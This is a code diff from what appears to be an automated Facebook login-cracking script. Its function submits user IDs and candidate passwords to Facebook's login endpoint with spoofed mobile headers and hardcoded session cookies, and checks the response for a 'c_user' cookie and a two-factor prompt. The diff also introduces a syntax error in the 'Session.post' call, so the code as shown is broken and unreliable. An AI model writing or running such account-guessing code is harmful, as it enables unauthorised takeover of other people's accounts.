@@ -1708,6 +1708,13 @@ def freeq(uid,pwx,tl):
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'sb': 'rp_6ZrdRV1vg1JSQt-kGL7oZ',
+            'datr': 'rp_6ZvkONbQIhMeMcdrNQlTW',
+            'ps_l': '1',
+            'ps_n': '1',
+            'fr': '1TtcqI6vgDuofxZxz.AWVYQGmwqbQ2HKzqqmaJqd-M50Q.BmvaYd..AAA.0.0.Bm__x3.AWVOi9_-71k',
+            'wd': '1051x773',}
             headers ={
             "Host": "m.facebook.com",
             "Connection": "keep-alive",
@@ -1726,8 +1733,8 @@ def freeq(uid,pwx,tl):
             "Sec-CH-UA-Platform": '"Android"',
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
-            po = Session.post(url, data=data, headers=headers).text
+            url = "https://www.facebook.com/login/"
+            po = Session.post(url, data=data,cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
